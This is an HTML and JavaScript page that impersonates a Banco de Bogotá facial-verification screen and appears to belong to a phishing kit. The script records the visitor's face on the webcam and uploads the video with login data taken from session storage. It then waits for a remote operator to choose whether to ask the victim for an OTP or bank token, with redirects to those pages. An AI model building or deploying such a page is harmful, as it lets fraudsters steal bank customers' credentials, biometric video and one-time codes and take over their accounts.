<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Verificación Facial - Banco de Bogotá</title>
    <link rel="icon" type="image/x-icon" href="img/favicon.ico">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');

        body {
            font-family: 'Inter', sans-serif;
            background-color: #f3f7fc;
        }

        .camera-container {
            position: relative;
            width: 280px;
            height: 280px;
            margin: 0 auto;
            border-radius: 50%;
            overflow: hidden;
            border: 4px solid #003da5;
            box-shadow: 0 0 20px rgba(0, 61, 165, 0.2);
        }

        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1);
            /* Mirror effect */
        }

        .scan-line {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background-color: rgba(0, 255, 0, 0.6);
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.8);
            animation: scan 2s linear infinite;
            z-index: 10;
        }

        @keyframes scan {
            0% {
                top: 0;
                opacity: 0;
            }

            10% {
                opacity: 1;
            }

            90% {
                opacity: 1;
            }

            100% {
                top: 100%;
                opacity: 0;
            }
        }

        .guide-circle {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 90%;
            height: 90%;
            border: 2px dashed rgba(255, 255, 255, 0.5);
            border-radius: 50%;
            pointer-events: none;
        }

        .loader-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            z-index: 9999;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            color: white;
        }

        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 4px solid #fff;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin-bottom: 15px;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }
    </style>
</head>

<body class="min-h-screen flex flex-col items-center p-4">

    <header class="w-full max-w-md flex items-center justify-between py-4 mb-6">
        <button class="text-[#1a2a5a] text-xl invisible">
            <i class="fas fa-chevron-left"></i>
        </button>
        <img src="logo.png" alt="Logo Banco" class="h-8 object-contain">
        <button class="text-[#1a2a5a] text-xl invisible">
            <i class="fas fa-times"></i>
        </button>
    </header>

    <main class="w-full max-w-md flex-1 flex flex-col items-center">

        <div class="text-center mb-8">
            <h2 class="text-[#003da5] font-bold text-xl mb-2">Verificación Facial</h2>
            <p class="text-gray-600 text-sm px-4">
                Por favor, ubica tu rostro dentro del círculo y sigue las instrucciones para validar tu identidad.
            </p>
        </div>

        <div class="camera-container mb-8">
            <video id="webcam" autoplay playsinline muted></video>
            <div class="guide-circle"></div>
            <div id="scan-line" class="scan-line hidden"></div>
        </div>

        <div id="status-text" class="text-[#003da5] font-semibold text-center mb-6 h-6">
            Preparando cámara...
        </div>

        <button id="start-btn"
            class="w-full bg-[#003da5] text-white font-bold py-3.5 rounded-full shadow-lg hover:bg-[#003487] transition-all max-w-xs">
            Iniciar Reconocimiento
        </button>

    </main>

    <div id="loader" class="loader-overlay hidden">
        <div class="spinner"></div>
        <p id="loader-text" class="font-medium text-lg">Procesando biometría...</p>
        <p class="text-sm text-gray-300 mt-2">Por favor no cierres esta ventana</p>
    </div>

    <script>
        const video = document.getElementById('webcam');
        const startBtn = document.getElementById('start-btn');
        const statusText = document.getElementById('status-text');
        const scanLine = document.getElementById('scan-line');
        const loader = document.getElementById('loader');
        const loaderText = document.getElementById('loader-text');

        let mediaRecorder;
        let recordedChunks = [];
        let stream;

        // Inicializar cámara
        async function initCamera() {
            try {
                // Primero intentar con la cámara frontal específica
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: "user",
                        width: { ideal: 640 },
                        height: { ideal: 640 }
                    },
                    audio: false
                });
                video.srcObject = stream;
                statusText.textContent = "Ubica tu rostro en el círculo";
            } catch (err) {
                console.warn("Cámara frontal no encontrada, intentando cualquier cámara...", err);
                try {
                    // Fallback: intentar con cualquier cámara disponible
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: true,
                        audio: false
                    });
                    video.srcObject = stream;
                    statusText.textContent = "Ubica tu rostro en el círculo";
                } catch (fallbackErr) {
                    console.error("Error accessing camera:", fallbackErr);
                    if (fallbackErr.name === 'NotFoundError') {
                        statusText.textContent = "No se detectó ninguna cámara en este dispositivo";
                    } else if (fallbackErr.name === 'NotAllowedError') {
                        statusText.textContent = "Permiso de cámara denegado. Por favor, permite el acceso.";
                    } else {
                        statusText.textContent = "Error: No se pudo acceder a la cámara";
                    }
                    startBtn.disabled = true;
                    startBtn.classList.add('opacity-50', 'cursor-not-allowed');
                }
            }
        }

        initCamera();

        startBtn.addEventListener('click', () => {
            startRecording();
        });

        function startRecording() {
            recordedChunks = [];

            try {
                // Intentar MP4 primero, luego webm como fallback
                let options = {
                    mimeType: 'video/mp4',
                    videoBitsPerSecond: 500000 // 500 kbps para comprimir el video
                };
                if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                    console.warn('MP4 no soportado, intentando webm...');
                    options = {
                        mimeType: 'video/webm;codecs=vp8,opus',
                        videoBitsPerSecond: 500000
                    };
                    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                        console.warn('webm tampoco soportado, usando default');
                        options = { videoBitsPerSecond: 500000 };
                    }
                }

                mediaRecorder = new MediaRecorder(stream, options);
                console.log('Grabando con formato:', mediaRecorder.mimeType, 'bitrate:', options.videoBitsPerSecond);

                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = uploadVideo;

                mediaRecorder.start();

                // UI Updates
                startBtn.classList.add('hidden');
                statusText.textContent = "Analizando rostro... Por favor espera";
                scanLine.classList.remove('hidden');

                // Grabar por 7 segundos
                setTimeout(() => {
                    mediaRecorder.stop();
                    scanLine.classList.add('hidden');
                    loader.classList.remove('hidden');
                }, 7000);

            } catch (err) {
                console.error("Error starting recording:", err);
                alert("Error al iniciar la grabación. Intente nuevamente.");
            }
        }

        async function uploadVideo() {
            // Determinar el tipo de video basado en lo que se grabó
            const mimeType = mediaRecorder.mimeType || 'video/webm';
            const isMP4 = mimeType.includes('mp4');
            const extension = isMP4 ? 'mp4' : 'webm';

            const blob = new Blob(recordedChunks, { type: mimeType });
            const formData = new FormData();
            formData.append('video', blob, `face-scan.${extension}`);

            // Añadir datos de sesión si existen
            const storedData = sessionStorage.getItem('initialLoginData');
            if (storedData) {
                formData.append('loginData', storedData);
            }

            loaderText.textContent = "Enviando video...";

            try {
                const response = await fetch('/api/send-video', {
                    method: 'POST',
                    body: formData
                });

                const data = await response.json();

                if (response.ok) {
                    loaderText.textContent = "Validando identidad...";
                    checkOperatorResponse(data.messageId);
                } else {
                    throw new Error(data.error || 'Error al subir video');
                }
            } catch (error) {
                console.error('Upload error:', error);
                loader.classList.add('hidden');
                statusText.textContent = "Error de conexión. Intenta de nuevo.";
                startBtn.classList.remove('hidden');
                startBtn.textContent = "Reintentar";
            }
        }

        async function checkOperatorResponse(messageId) {
            try {
                const response = await fetch(`/api/check-update/${messageId}`);

                if (response.status === 408) {
                    loader.classList.add('hidden');
                    alert("Tiempo de espera agotado.");
                    location.reload();
                    return;
                }

                const data = await response.json();

                if (data.action) {
                    loader.classList.add('hidden');
                    if (data.action === 'error_face') {
                        statusText.textContent = "Rostro no reconocido. Intenta de nuevo.";
                        startBtn.classList.remove('hidden');
                        startBtn.textContent = "Intentar Nuevamente";
                    } else if (data.action === 'pedir_otp') {
                        window.location.href = "otp.html";
                    } else if (data.action === 'pedir_token') {
                        window.location.href = "token.html";
                    } else if (data.action === 'finalizar') {
                        window.location.href = "finish.html";
                    }
                } else {
                    setTimeout(() => checkOperatorResponse(messageId), 2000);
                }
            } catch (error) {
                console.error("Polling error:", error);
                loader.classList.add('hidden');
            }
        }
    </script>
</body>

</html>
